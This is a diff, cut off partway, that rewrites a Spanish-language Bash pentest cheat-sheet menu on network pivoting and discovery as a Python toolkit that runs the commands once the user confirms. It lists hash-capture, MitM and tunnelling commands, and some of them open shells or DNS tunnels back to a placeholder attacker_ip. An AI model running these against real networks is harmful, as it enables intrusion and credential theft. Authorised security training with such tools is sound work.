@@ -1,604 +1,803 @@
-#!/bin/bash
+#!/usr/bin/env python3
+"""
+╔══════════════════════════════════════════════════════════════╗
+║          NETWORK PIVOTING & DISCOVERY TOOLKIT                ║
+║          Reescrito en Python - Enfoque Educativo             ║
+║          Autor: Oliver - github.com/oliverexx                ║
+╚══════════════════════════════════════════════════════════════╝
 
-# Colores para la interfaz
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
-CYAN='\033[0;36m'
-MAGENTA='\033[0;35m'
-NC='\033[0m' # No Color
+USO ÉTICO: Esta herramienta es exclusivamente para entornos
+de laboratorio, CTFs o redes donde tengas autorización explícita.
+"""
 
-# Configuración global
-JUMP_HOST="192.168.1.100"
-TARGET_NETWORK="192.168.2.0/24"
-LOCAL_PORT="1080"
-REMOTE_PORT="3389"
-SOCKS_PORT="1080"
+import subprocess
+import sys
+import os
+import shutil
+import socket
+import ipaddress
+import time
+import argparse
+from datetime import datetime
+from typing import Optional
 
-# Función para mostrar el banner
-show_banner() {
-clear
-echo -e "${BLUE}"
-echo "===================================================================================="
-echo "|                          NETWORK PIVOTING & DISCOVERY                             |"
-echo "===================================================================================="
-echo ""
-echo "Descripción:# Network Pivoting & Discovery"
-echo "Guía completa de técnicas de pivoting y descubrimiento de redes"
-echo "Autor: Oliver - github: https://github.com/oliverexx"
-echo "github: https://github.com/oliverexx"
-echo "Linkedin: www.linkedin.com/in/axel-tear"
-echo "Fecha: 2025"
-echo "==============================================================================="
 
-echo -e "${NC}"
-echo -e "${YELLOW}Jump Host:${NC} $JUMP_HOST"
-echo -e "${YELLOW}Target Network:${NC} $TARGET_NETWORK"
-echo -e "${YELLOW}SOCKS Port:${NC} $SOCKS_PORT"
-echo
+# ─────────────────────────────────────────────
+#  COLORES (ANSI)
+# ─────────────────────────────────────────────
+class C:
+    RED     = "\033[0;31m"
+    GREEN   = "\033[0;32m"
+    YELLOW  = "\033[1;33m"
+    BLUE    = "\033[0;34m"
+    CYAN    = "\033[0;36m"
+    MAGENTA = "\033[0;35m"
+    BOLD    = "\033[1m"
+    DIM     = "\033[2m"
+    NC      = "\033[0m"
+
+def red(t):     return f"{C.RED}{t}{C.NC}"
+def green(t):   return f"{C.GREEN}{t}{C.NC}"
+def yellow(t):  return f"{C.YELLOW}{t}{C.NC}"
+def blue(t):    return f"{C.BLUE}{t}{C.NC}"
+def cyan(t):    return f"{C.CYAN}{t}{C.NC}"
+def magenta(t): return f"{C.MAGENTA}{t}{C.NC}"
+def bold(t):    return f"{C.BOLD}{t}{C.NC}"
+def dim(t):     return f"{C.DIM}{t}{C.NC}"
+
+
+# ─────────────────────────────────────────────
+#  CONFIG GLOBAL
+# ─────────────────────────────────────────────
+class Config:
+    jump_host      = "192.168.1.100"
+    target_network = "192.168.2.0/24"
+    local_port     = 1080
+    remote_port    = 3389
+    socks_port     = 1080
+    ssh_user       = "user"
+    log_enabled    = False
+    log_file       = f"pivot_session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
+
+cfg = Config()
+
+
+# ─────────────────────────────────────────────
+#  HELPERS DE UI
+# ─────────────────────────────────────────────
+def clear():
+    os.system("clear" if os.name != "nt" else "cls")
+
+def banner():
+    clear()
+    print(blue("═" * 66))
+    print(bold(blue("  NETWORK PIVOTING & DISCOVERY TOOLKIT  ·  Python Edition")))
+    print(blue("═" * 66))
+    print(dim(f"  Jump Host      : {cfg.jump_host}"))
+    print(dim(f"  Target Network : {cfg.target_network}"))
+    print(dim(f"  SOCKS Port     : {cfg.socks_port}"))
+    print(dim(f"  Logging        : {'ON → ' + cfg.log_file if cfg.log_enabled else 'OFF'}"))
+    print(blue("─" * 66))
+    print()
+
+def pause():
+    input(yellow("\n  [Enter para continuar...]"))
+
+def section(title: str):
+    print()
+    print(cyan(f"  ┌─ {title} " + "─" * max(0, 58 - len(title)) + "┐"))
+
+def show_command(cmd: str, description: str):
+    """Muestra un comando con descripción y pregunta si ejecutarlo."""
+    print()
+    print(f"  {green('▸')} {bold(description)}")
+    print(f"  {yellow('$')} {cyan(cmd)}")
+
+def log(text: str):
+    if cfg.log_enabled:
+        with open(cfg.log_file, "a") as f:
+            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {text}\n")
+
+
+# ─────────────────────────────────────────────
+#  VERIFICACIÓN DE HERRAMIENTAS
+# ─────────────────────────────────────────────
+TOOLS = {
+    "nmap":         "Escaneo de puertos y servicios",
+    "masscan":      "Escaneo ultrarrápido de redes",
+    "netdiscover":  "Descubrimiento ARP",
+    "responder":    "Captura de hashes NTLM",
+    "bettercap":    "Análisis MitM",
+    "chisel":       "TCP/UDP tunneling",
+    "sshuttle":     "VPN-like sobre SSH",
+    "proxychains":  "Encadenado de proxies",
+    "ssh":          "Secure Shell",
+    "python3":      "Python 3",
+    "iodine":       "DNS tunneling",
+    "ptunnel":      "ICMP tunneling",
 }
 
-# Función para pausa y continuar
-press_enter() {
-echo
-echo -e "${YELLOW}Presiona Enter para continuar...${NC}"
-read
-}
+def check_tools() -> dict[str, bool]:
+    return {tool: shutil.which(tool) is not None for tool in TOOLS}
 
-# Función para mostrar comandos
-show_command() {
-local command=$1
-local description=$2
+def show_tool_status():
+    banner()
+    section("Estado de Herramientas Instaladas")
+    print()
+    status = check_tools()
+    installed = [t for t, ok in status.items() if ok]
+    missing   = [t for t, ok in status.items() if not ok]
 
-echo -e "${GREEN}Descripción:${NC} $description"
-echo -e "${CYAN}Comando:${NC}"
-echo -e "${YELLOW}$command${NC}"
-echo
-}
+    print(f"  {green('✔ Instaladas')}  ({len(installed)})")
+    for t in installed:
+        print(f"      {green('●')} {t:<16} {dim(TOOLS[t])}")
 
-# Función principal
-main_menu() {
-while true; do
-show_banner
-echo -e "${GREEN}Menú Principal - Pivoting & Discovery:${NC}"
-echo "1. Técnicas de Pivoting"
-echo "2. Herramientas de Discovery"
-echo "3. SSH Tunneling"
-echo "4. Metasploit Pivoting"
-echo "5. Herramientas Avanzadas"
-echo "6. Configuración de Entorno"
-echo "0. Salir"
-echo
-read -p "Selecciona una opción [0-6]: " option
+    print()
+    print(f"  {red('✘ No encontradas')}  ({len(missing)})")
+    for t in missing:
+        print(f"      {red('○')} {t:<16} {dim(TOOLS[t])}")
 
-case $option in
-1) pivoting_menu ;;
-2) discovery_menu ;;
-3) ssh_tunneling_menu ;;
-4) metasploit_pivoting_menu ;;
-5) advanced_tools_menu ;;
-6) config_menu ;;
-0) exit 0 ;;
-*) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; sleep 2 ;;
-esac
-done
-}
+    print()
+    if missing:
+        print(yellow(f"  Tip: instala herramientas faltantes con apt/brew/go."))
+    pause()
 
-# ==============================================
-# MENÚS ESPECÍFICOS
-# ==============================================
 
-# Menú de Técnicas de Pivoting
-pivoting_menu() {
-while true; do
-show_banner
-echo -e "${GREEN}Técnicas de Pivoting:${NC}"
-echo "1. SSH Tunneling (Básico)"
-echo "2. Port Forwarding (Windows)"
-echo "3. SOCKS Proxies"
-echo "4. VPN Pivoting"
-echo "5. DNS Tunneling"
-echo "6. ICMP Tunneling"
-echo "7. Volver al Menú Principal"
-echo
-read -p "Selecciona una opción [1-7]: " option
+# ─────────────────────────────────────────────
+#  EJECUCIÓN REAL DE COMANDOS
+# ─────────────────────────────────────────────
+def run_command(cmd: str, description: str, dry_run: bool = False):
+    """
+    Muestra el comando, pide confirmación y lo ejecuta (o simula).
+    Captura output en tiempo real.
+    """
+    print()
+    print(f"  {green('▸')} {bold(description)}")
+    print(f"  {yellow('$')} {cyan(cmd)}")
+    print()
 
-case $option in
-1) ssh_basic_info ;;
-2) windows_pf_info ;;
-3) socks_proxies_info ;;
-4) vpn_pivoting_info ;;
-5) dns_tunneling_info ;;
-6) icmp_tunneling_info ;;
-7) break ;;
-*) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
-esac
-done
-}
+    tool = cmd.split()[0]
+    if not dry_run and not shutil.which(tool):
+        print(red(f"  ✘ '{tool}' no está instalado. Saltando ejecución."))
+        log(f"SKIP (not installed): {cmd}")
+        return
 
-# Menú de Herramientas de Discovery
-discovery_menu() {
-while true; do
-show_banner
-echo -e "${GREEN}Herramientas de Discovery:${NC}"
-echo "1. Nmap Escaneo Avanzado"
-echo "2. Masscan - Escaneo Rápido"
-echo "3. Netdiscover - ARP Discovery"
-echo "4. Responder - LLMNR/NBT-NS"
-echo "5. Bettercap - Análisis Completo"
-echo "6. Volver al Menú Principal"
-echo
-read -p "Selecciona una opción [1-6]: " option
+    confirm = input(f"  {magenta('¿Ejecutar este comando? [s/N/d(dry)]')} ").strip().lower()
 
-case $option in
-1) nmap_advanced_info ;;
-2) masscan_info ;;
-3) netdiscover_info ;;
-4) responder_info ;;
-5) bettercap_info ;;
-6) break ;;
-*) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
-esac
-done
-}
+    if confirm == "d" or dry_run:
+        print(dim("  [Dry-run] Comando no ejecutado."))
+        log(f"DRY-RUN: {cmd}")
+        return
 
-# Menú de SSH Tunneling
-ssh_tunneling_menu() {
-while true; do
-show_banner
-echo -e "${GREEN}SSH Tunneling Avanzado:${NC}"
-echo "1. Local Port Forwarding"
-echo "2. Remote Port Forwarding"
-echo "3. Dynamic Port Forwarding (SOCKS)"
-echo "4. SSH Multiplexing"
-echo "5. SSH Config Avanzado"
-echo "6. Volver al Menú Principal"
-echo
-read -p "Selecciona una opción [1-6]: " option
+    if confirm != "s":
+        print(dim("  Saltado."))
+        return
 
-case $option in
-1) ssh_local_pf_info ;;
-2) ssh_remote_pf_info ;;
-3) ssh_dynamic_pf_info ;;
-4) ssh_multiplexing_info ;;
-5) ssh_config_info ;;
-6) break ;;
-*) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
-esac
-done
-}
+    print(blue("─" * 66))
+    log(f"EXEC: {cmd}")
 
-# Menú de Metasploit Pivoting
-metasploit_pivoting_menu() {
-while true; do
-show_banner
-echo -e "${GREEN}Metasploit Pivoting:${NC}"
-echo "1. Meterpreter Port Forwarding"
-echo "2. Autoroute y SOCKS"
-echo "3. Pivoting Completo"
-echo "4. Reverse Pivoting"
-echo "5. Volver al Menú Principal"
-echo
-read -p "Selecciona una opción [1-5]: " option
+    try:
+        process = subprocess.Popen(
+            cmd, shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1
+        )
+        for line in process.stdout:
+            sys.stdout.write(f"  {dim(line)}")
+            log(f"OUT: {line.rstrip()}")
+        process.wait()
+        rc = process.returncode
+        status = green(f"✔ Salió con código {rc}") if rc == 0 else red(f"✘ Código de salida: {rc}")
+        print(f"\n  {status}")
+        log(f"EXIT CODE: {rc}")
+    except KeyboardInterrupt:
+        print(yellow("\n  Interrumpido por el usuario."))
+        log("INTERRUPTED")
+    except Exception as e:
+        print(red(f"  Error: {e}"))
 
-case $option in
-1) metasploit_pf_info ;;
-2) metasploit_socks_info ;;
-3) metasploit_full_pivot_info ;;
-4) metasploit_reverse_info ;;
-5) break ;;
-*) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
-esac
-done
-}
+    print(blue("─" * 66))
 
-# Menú de Herramientas Avanzadas
-advanced_tools_menu() {
-while true; do
-show_banner
-echo -e "${GREEN}Herramientas Avanzadas:${NC}"
-echo "1. Chisel - TCP/UDP Tunneling"
-echo "2. Rpivot - SOCKS Proxy"
-echo "3. reGeorg - Web Tunneling"
-echo "4. sshuttle - VPN-like Proxy"
-echo "5. Plink (Windows SSH)"
-echo "6. Proxychains Config"
-echo "7. Volver al Menú Principal"
-echo
-read -p "Selecciona una opción [1-7]: " option
 
-case $option in
-1) chisel_info ;;
-2) rpivot_info ;;
-3) regeorg_info ;;
-4) sshuttle_info ;;
-5) plink_info ;;
-6) proxychains_config_info ;;
-7) break ;;
-*) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; press_enter ;;
-esac
-done
-}
+# ─────────────────────────────────────────────
+#  AUTO-DETECCIÓN DE RED
+# ─────────────────────────────────────────────
+def detect_network():
+    banner()
+    section("Auto-detección de Interfaces y Red")
+    print()
 
-# Menú de Configuración
-config_menu() {
-while true; do
-show_banner
-echo -e "${GREEN}Configuración de Entorno:${NC}"
-echo "1. Configurar Jump Host"
-echo "2. Configurar Target Network"
-echo "3. Configurar Puerto Local"
-echo "4. Configurar Puerto Remoto"
-echo "5. Configurar Puerto SOCKS"
-echo "6. Volver al Menú Principal"
-echo
-read -p "Selecciona una opción [1-6]: " option
+    # Interfaces activas (Linux/macOS)
+    try:
+        result = subprocess.run(
+            ["ip", "-o", "addr", "show"],
+            capture_output=True, text=True
+        )
+        if result.returncode == 0:
+            print(f"  {bold('Interfaces detectadas:')}")
+            for line in result.stdout.splitlines():
+                parts = line.split()
+                if len(parts) >= 4 and parts[2] in ("inet", "inet6"):
+                    iface = parts[1]
+                    addr  = parts[3]
+                    print(f"    {green('●')} {iface:<12} {cyan(addr)}")
+        else:
+            raise Exception("ip no disponible")
+    except Exception:
+        # fallback macOS / sistemas sin 'ip'
+        try:
+            result = subprocess.run(["ifconfig"], capture_output=True, text=True)
+            print(dim("  (salida de ifconfig — usa 'ip addr' para más detalle)"))
+            for line in result.stdout.splitlines()[:20]:
+                print(f"  {dim(line)}")
+        except Exception:
+            print(yellow("  No se pudo detectar interfaces automáticamente."))
 
-case $option in
-1) read -p "Nuevo Jump Host: " JUMP_HOST; echo -e "${GREEN}Jump Host configurado a: $JUMP_HOST${NC}"; sleep 2 ;;
-2) read -p "Nueva Target Network: " TARGET_NETWORK; echo -e "${GREEN}Target Network configurado a: $TARGET_NETWORK${NC}"; sleep 2 ;;
-3) read -p "Nuevo Puerto Local: " LOCAL_PORT; echo -e "${GREEN}Puerto Local configurado a: $LOCAL_PORT${NC}"; sleep 2 ;;
-4) read -p "Nuevo Puerto Remoto: " REMOTE_PORT; echo -e "${GREEN}Puerto Remoto configurado a: $REMOTE_PORT${NC}"; sleep 2 ;;
-5) read -p "Nuevo Puerto SOCKS: " SOCKS_PORT; echo -e "${GREEN}Puerto SOCKS configurado a: $SOCKS_PORT${NC}"; sleep 2 ;;
-6) break ;;
-*) echo -e "${RED}Opción no válida. Intenta nuevamente.${NC}"; sleep 2 ;;
-esac
-done
-}
+    # Gateway por defecto
+    print()
+    try:
+        result = subprocess.run(
+            ["ip", "route", "show", "default"],
+            capture_output=True, text=True
+        )
+        if result.returncode == 0 and result.stdout.strip():
+            print(f"  {bold('Gateway por defecto:')}")
+            print(f"    {green(result.stdout.strip())}")
+    except Exception:
+        pass
 
-# ==============================================
-# FUNCIONES DE INFORMACIÓN - PIVOTING
-# ==============================================
+    # Reachability del jump host
+    print()
+    print(f"  {bold('Verificando alcance de Jump Host')} ({cfg.jump_host})...")
+    try:
+        result = subprocess.run(
+            ["ping", "-c", "2", "-W", "1", cfg.jump_host],
+            capture_output=True, text=True, timeout=5
+        )
+        if result.returncode == 0:
+            print(f"  {green('✔')} {cfg.jump_host} es alcanzable.")
+        else:
+            print(f"  {red('✘')} {cfg.jump_host} no responde a ping.")
+    except Exception:
+        print(yellow("  No se pudo verificar alcance del jump host."))
 
-ssh_basic_info() {
-show_banner
-echo -e "${GREEN}SSH Tunneling Básico:${NC}"
-echo
-show_command "ssh -L $LOCAL_PORT:target_host:$REMOTE_PORT user@$JUMP_HOST" "Local Port Forwarding"
-show_command "ssh -R $REMOTE_PORT:localhost:$LOCAL_PORT user@$JUMP_HOST" "Remote Port Forwarding"
-show_command "ssh -D $SOCKS_PORT user@$JUMP_HOST" "Dynamic Port Forwarding (SOCKS)"
-echo -e "${MAGENTA}Objetivo:${NC} Crear túneles seguros a través de hosts intermedios."
-echo -e "${MAGENTA}Notas:${NC} Use claves SSH en lugar de contraseñas para mayor seguridad. El forwarding local (-L) redirige puertos del cliente al servidor through el jump host."
-press_enter
-}
+    pause()
 
-windows_pf_info() {
-show_banner
-echo -e "${GREEN}Windows Port Forwarding:${NC}"
-echo
-show_command "netsh interface portproxy add v4tov4 listenport=$LOCAL_PORT listenaddress=0.0.0.0 connectport=$REMOTE_PORT connectaddress=target_host" "Crear port forward"
-show_command "netsh interface portproxy show all" "Listar port forwards activos"
-show_command "netsh interface portproxy delete v4tov4 listenport=$LOCAL_PORT listenaddress=0.0.0.0" "Eliminar port forward"
-show_command "netsh advfirewall firewall add rule name=\"Port Forward $LOCAL_PORT\" dir=in action=allow protocol=TCP localport=$LOCAL_PORT" "Permitir puerto en firewall"
-echo -e "${MAGENTA}Objetivo:${NC} Redireccionar puertos en sistemas Windows."
-echo -e "${MAGENTA}Notas:${NC} Requiere privilegios administrativos. Verificar que el firewall permite el tráfico."
-press_enter
-}
 
-socks_proxies_info() {
-show_banner
-echo -e "${GREEN}SOCKS Proxies:${NC}"
-echo
-show_command "ssh -D $SOCKS_PORT -f -N user@$JUMP_HOST" "SOCKS Proxy con SSH (background)"
-show_command "proxychains nmap -sT -p 80,443,3389 target_host" "Usar proxychains con SOCKS"
-show_command "curl --socks5 127.0.0.1:$SOCKS_PORT http://internal_site" "CURL a través de SOCKS"
-show_command "proxychains xfreerdp /v:target_host /u:user" "RDP through SOCKS"
-echo -e "${MAGENTA}Objetivo:${NC} Enrutar tráfico de aplicaciones a través de proxies SOCKS."
-echo -e "${MAGENTA}Notas:${NC} Configure /etc/proxychains.conf para usar el proxy SOCKS. Algunas aplicaciones necesitan soporte nativo de SOCKS."
-press_enter
-}
+# ─────────────────────────────────────────────
+#  MÓDULOS DE CONTENIDO EDUCATIVO
+# ─────────────────────────────────────────────
 
-vpn_pivoting_info() {
-show_banner
-echo -e "${GREEN}VPN Pivoting:${NC}"
-echo
-show_command "openvpn --config client.ovpn" "OpenVPN connection"
-show_command "ip route add 192.168.10.0/24 via 10.8.0.1" "Add route through VPN"
-show_command "wg-quick up wg0" "WireGuard connection"
-show_command "route add -net 192.168.20.0 netmask 255.255.255.0 gw 10.9.0.1" "Add static route"
-echo -e "${MAGENTA}Objetivo:${NC} Conectar redes completas through VPN tunnels."
-echo -e "${MAGENTA}Notas:${NC} Más estable que SSH tunneling para redes completas. Requiere configuración previa del servidor VPN."
-press_enter
-}
+# ── SSH TUNNELING ────────────────────────────
+def module_ssh_local():
+    banner()
+    section("SSH · Local Port Forwarding")
+    print(f"""
+  {bold('Concepto:')}
+    Abre un puerto en tu máquina local que redirige tráfico
+    a través del jump host hacia un host interno.
 
-dns_tunneling_info() {
-show_banner
-echo -e "${GREEN}DNS Tunneling:${NC}"
-echo
-show_command "dnscat2-server --dns host=attacker_ip,port=53 --secret=mysecret" "Servidor dnscat2"
-show_command "dnscat2 victim.com --secret=mysecret" "Cliente dnscat2"
-show_command "iodined -f -c -P password 10.0.0.1 tunnel.domain.com" "Servidor iodine"
-show_command "iodine -f -P password tunnel.domain.com" "Cliente iodine"
-echo -e "${MAGENTA}Objetivo:${NC} Crear túneles a través de tráfico DNS para evadir firewalls."
-echo -e "${MAGENTA}Notas:${NC} Útil cuando solo el puerto 53 (DNS) está abierto. Requiere dominio propio y configuración DNS adecuada."
-press_enter
-}
+    [Tu PC :LOCAL_PORT] ──SSH──► [Jump Host] ──► [Host Interno :REMOTE_PORT]
 
-icmp_tunneling_info() {
-show_banner
-echo -e "${GREEN}ICMP Tunneling:${NC}"
-echo
-show_command "ptunnel -x password" "Servidor ptunnel"
-show_command "ptunnel -p attacker_ip -lp 1080 -da target_ip -dp 3389 -x password" "Cliente ptunnel"
-show_command "icmpsh -t target_ip -s attacker_ip" "icmpsh (simple)"
-show_command "ping -c 4 -p \"68656c6c6f\" target_ip" "Ping con payload"
-echo -e "${MAGENTA}Objetivo:${NC} Tunneling a través de paquetes ICMP (ping)."
-echo -e "${MAGENTA}Notas:${NC} Funciona incluso en redes muy restrictivas. Bajo ancho de banda. Puede ser detectado por IDS/IPS."
-press_enter
-}
+  {bold('Cuándo usarlo:')}
+    - Acceder a RDP/SMB de hosts internos desde tu máquina.
+    - El host interno no es accesible directamente desde Internet.
+""")
+    cmds = [
+        (f"ssh -L {cfg.local_port}:internal_host:{cfg.remote_port} {cfg.ssh_user}@{cfg.jump_host}",
+         "Forward RDP (puerto único)"),
+        (f"ssh -L 445:internal_host:445 {cfg.ssh_user}@{cfg.jump_host}",
+         "Forward SMB"),
+        (f"ssh -L {cfg.local_port}:internal_host:{cfg.remote_port} -N -f {cfg.ssh_user}@{cfg.jump_host}",
+         "Forward en background (no shell interactiva)"),
+        (f"ssh -L 9000-9010:internal_host:9000-9010 {cfg.ssh_user}@{cfg.jump_host}",
+         "Forward de rango de puertos"),
+    ]
+    for cmd, desc in cmds:
+        run_command(cmd, desc)
+    pause()
 
-# ==============================================
-# FUNCIONES DE INFORMACIÓN - DISCOVERY
-# ==============================================
+def module_ssh_remote():
+    banner()
+    section("SSH · Remote Port Forwarding")
+    print(f"""
+  {bold('Concepto:')}
+    Expone un puerto de tu máquina local en el jump host.
+    Útil para recibir conexiones reverse desde la red interna.
 
-nmap_advanced_info() {
-show_banner
-echo -e "${GREEN}Nmap Escaneo Avanzado:${NC}"
-echo
-show_command "nmap -sS -sV -sC -O -T4 $TARGET_NETWORK" "Escaneo completo con detección de OS"
-show_command "nmap -p- --min-rate 10000 $TARGET_NETWORK" "Escaneo rápido de todos los puertos"
-show_command "nmap --script vuln,smb-enum-shares $TARGET_NETWORK" "Detección de vulnerabilidades"
-show_command "nmap -sU -p 53,67,68,69,123,137,161,162 $TARGET_NETWORK" "Escaneo UDP"
-show_command "nmap -sS -p 80,443 --script http-enum $TARGET_NETWORK" "Enumeración HTTP"
-echo -e "${MAGENTA}Objetivo:${NC} Descubrir hosts, servicios y vulnerabilidades."
-echo -e "${MAGENTA}Notas:${NC} Combine diferentes técnicas para obtener información completa. Use --script-help para ver scripts disponibles."
-press_enter
-}
+    [Jump Host :REMOTE_PORT] ◄──SSH──── [Tu PC] ──► [Servicio Local]
 
-masscan_info() {
-show_banner
-echo -e "${GREEN}Masscan - Escaneo Rápido:${NC}"
-echo
-show_command "masscan -p1-65535 $TARGET_NETWORK --rate 10000" "Escaneo rápido de puertos"
-show_command "masscan -p80,443,3389,22 $TARGET_NETWORK --rate 5000" "Escaneo de puertos comunes"
-show_command "masscan -iL targets.txt -p1-65535 --rate 10000" "Escaneo desde lista de archivos"
-show_command "masscan --ping $TARGET_NETWORK" "Solo descubrimiento de hosts"
-echo -e "${MAGENTA}Objetivo:${NC} Escaneo ultrarrápido de grandes redes."
-echo -e "${MAGENTA}Notas:${NC} Masscan puede escanear Internet completo en minutos. Use con precaución para no saturar redes."
-press_enter
-}
+  {bold('Cuándo usarlo:')}
+    - Recibir reverse shells de hosts internos.
+    - Bypasear NAT cuando el jump host sí tiene IP pública.
+""")
+    cmds = [
+        (f"ssh -R {cfg.remote_port}:localhost:80 {cfg.ssh_user}@{cfg.jump_host}",
+         "Exponer web local en el jump host"),
+        (f"ssh -R 2222:localhost:22 {cfg.ssh_user}@{cfg.jump_host}",
+         "Exponer SSH local"),
+        (f"ssh -R 0.0.0.0:{cfg.remote_port}:internal_host:{cfg.remote_port} {cfg.ssh_user}@{cfg.jump_host}",
+         "Exponer en todas las interfaces del jump host"),
+    ]
+    for cmd, desc in cmds:
+        run_command(cmd, desc)
+    pause()
 
-netdiscover_info() {
-show_banner
-echo -e "${GREEN}Netdiscover - ARP Discovery:${NC}"
-echo
-show_command "netdiscover -i eth0 -r $TARGET_NETWORK" "Descubrimiento ARP activo"
-show_command "netdiscover -p -i eth0" "Modo pasivo (solo escucha)"
-show_command "netdiscover -l hosts.txt" "Escaneo desde archivo"
-show_command "netdiscover -f" "Modo rápido (menos verificación)"
-echo -e "${MAGENTA}Objetivo:${NC} Descubrir hosts en red local mediante ARP."
-echo -e "${MAGENTA}Notas:${NC} Muy efectivo en redes LAN. No funciona a través de routers. El modo pasivo es más sigiloso."
-press_enter
-}
+def module_ssh_dynamic():
+    banner()
+    section("SSH · Dynamic Port Forwarding (SOCKS Proxy)")
+    print(f"""
+  {bold('Concepto:')}
+    Crea un proxy SOCKS en tu máquina. Todo el tráfico que
+    lo use será enrutado a través del jump host.
 
-responder_info() {
-show_banner
-echo -e "${GREEN}Responder - LLMNR/NBT-NS:${NC}"
-echo
-show_command "responder -I eth0 -wrf" "Modo activo (respuestas)"
-show_command "responder -I eth0 -A" "Modo análisis (solo escucha)"
-show_command "responder -I eth0 -dw" "Deshabilitar HTTP/SMB"
-show_command "cat /usr/share/responder/logs/*.txt" "Ver logs capturados"
-echo -e "${MAGENTA}Objetivo:${NC} Capturar hashes NTLMv2 through LLMNR/NBT-NS poisoning."
-echo -e "${MAGENTA}Notas:${NC} Muy efectivo en redes Windows. Puede interrumpir servicios legítimos, usar con cuidado."
-press_enter
-}
+    [Tu App] ──SOCKS:{cfg.socks_port}──► [Tu PC] ──SSH──► [Jump Host] ──► [Destino]
 
-bettercap_info() {
-show_banner
-echo -e "${GREEN}Bettercap - Análisis Completo:${NC}"
-echo
-show_command "bettercap -iface eth0" "Modo interactivo"
-show_command "bettercap -iface eth0 -sniff" "Sniffing de tráfico"
-show_command "bettercap -iface eth0 -eval 'net.probe on; net.recon on'" "Descubrimiento automático"
-show_command "bettercap -iface eth0 -caplet hstshijack/hstshijack" "HSTS Hijacking"
-echo -e "${MAGENTA}Objetivo:${NC} Análisis completo de red y ataques Man-in-the-Middle."
-echo -e "${MAGENTA}Notas:${NC} Herramienta muy poderosa. Use responsablemente y solo en redes propias o con autorización."
-press_enter
-}
+  {bold('Cuándo usarlo:')}
+    - Navegar la red interna completa sin rutas estáticas.
+    - Usar con proxychains para redirigir cualquier herramienta.
+""")
+    cmds = [
+        (f"ssh -D {cfg.socks_port} {cfg.ssh_user}@{cfg.jump_host}",
+         "SOCKS proxy interactivo"),
+        (f"ssh -D {cfg.socks_port} -q -N -f {cfg.ssh_user}@{cfg.jump_host}",
+         "SOCKS en background (silencioso)"),
+        (f"ssh -D {cfg.socks_port} -C {cfg.ssh_user}@{cfg.jump_host}",
+         "SOCKS con compresión"),
+        (f"proxychains nmap -sT -p 80,443,445,3389 192.168.2.1",
+         "Usar proxychains con el proxy activo"),
+    ]
+    for cmd, desc in cmds:
+        run_command(cmd, desc)
+    pause()
 
-# ==============================================
-# FUNCIONES DE INFORMACIÓN - SSH TUNNELING
-# ==============================================
+def module_ssh_jump():
+    banner()
+    section("SSH · ProxyJump (múltiples saltos)")
+    print(f"""
+  {bold('Concepto:')}
+    Encadena múltiples hosts SSH para llegar a destinos
+    profundamente anidados en la red.
 
-ssh_local_pf_info() {
-show_banner
-echo -e "${GREEN}SSH Local Port Forwarding:${NC}"
-echo
-show_command "ssh -L 3389:internal_host:3389 user@$JUMP_HOST" "Forward RDP"
-show_command "ssh -L 445:internal_host:445 user@$JUMP_HOST" "Forward SMB"
-show_command "ssh -L 9000-9010:internal_host:9000-9010 user@$JUMP_HOST" "Forward rango de puertos"
-echo -e "${MAGENTA}Objetivo:${NC} Redireccionar puertos locales a hosts internos through jump host."
-echo -e "${MAGENTA}Notas:${NC} Los puertos se abren en localhost. Use -g para permitir conexiones externas (peligroso)."
-press_enter
-}
+    [Tu PC] ──SSH──► [Jump1] ──SSH──► [Jump2] ──SSH──► [Destino]
 
-ssh_remote_pf_info() {
-show_banner
-echo -e "${GREEN}SSH Remote Port Forwarding:${NC}"
-echo
-show_command "ssh -R 8080:localhost:80 user@$JUMP_HOST" "Exponer web local"
-show_command "ssh -R 2222:localhost:22 user@$JUMP_HOST" "Exponer SSH local"
-show_command "ssh -R 0.0.0.0:3389:internal_host:3389 user@$JUMP_HOST" "Exponer en todas las interfaces"
-echo -e "${MAGENTA}Objetivo:${NC} Exponer servicios locales al jump host."
-echo -e "${MAGENTA}Notas:${NC} Útil para bypassear NAT/firewalls. Por defecto solo se expone en localhost del jump host."
-press_enter
-}
+  {bold('Cuándo usarlo:')}
+    - Redes segmentadas con múltiples DMZ/firewalls.
+    - Penetration testing de infraestructuras complejas.
+""")
+    cmds = [
+        (f"ssh -J {cfg.ssh_user}@{cfg.jump_host} {cfg.ssh_user}@internal_host",
+         "Un solo salto (ProxyJump)"),
+        (f"ssh -J user1@jump1,user2@jump2 user3@destino_final",
+         "Dos saltos encadenados"),
+        (f"ssh -J {cfg.ssh_user}@{cfg.jump_host} -L {cfg.local_port}:localhost:{cfg.remote_port} {cfg.ssh_user}@internal_host",
+         "Port forward a través de ProxyJump"),
+    ]
+    for cmd, desc in cmds:
+        run_command(cmd, desc)
 
-ssh_dynamic_pf_info() {
-show_banner
-echo -e "${GREEN}SSH Dynamic Port Forwarding:${NC}"
-echo
-show_command "ssh -D $SOCKS_PORT user@$JUMP_HOST" "SOCKS proxy básico"
-show_command "ssh -D $SOCKS_PORT -C user@$JUMP_HOST" "SOCKS con compresión"
-show_command "ssh -D $SOCKS_PORT -q -N user@$JUMP_HOST" "SOCKS silencioso en background"
-echo -e "${MAGENTA}Objetivo:${NC} Crear proxy SOCKS dinámico through SSH."
-echo -e "${MAGENTA}Notas:${NC} Todas las aplicaciones pueden usar este proxy. Configure browser o proxychains."
-press_enter
-}
+    print()
+    section("Configuración ~/.ssh/config equivalente")
+    config_example = f"""
+  Host jump
+      HostName {cfg.jump_host}
+      User {cfg.ssh_user}
+      IdentityFile ~/.ssh/id_rsa
 
-ssh_multiplexing_info() {
-show_banner
-echo -e "${GREEN}SSH Multiplexing:${NC}"
-echo
-show_command "ssh -M -S /tmp/ssh_mux -f -N user@$JUMP_HOST" "Create master connection"
-show_command "ssh -S /tmp/ssh_mux user@$JUMP_HOST" "Reuse connection"
